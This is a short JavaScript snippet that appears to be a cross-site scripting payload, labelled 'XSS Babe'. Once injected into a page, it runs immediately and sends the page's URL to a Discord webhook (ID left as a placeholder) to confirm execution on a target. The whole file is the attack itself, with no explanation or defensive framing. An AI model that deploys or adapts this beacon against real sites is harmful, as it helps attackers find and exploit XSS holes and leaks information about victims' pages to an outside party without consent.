(function () {
    const data = {
        content: "[XSS Babe ⚔️] Target page loaded: " + window.location.href,
    };

    fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_ID_HERE", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
    }).catch((e) => {
        console.error("Discord logging failed", e);
    });
})();
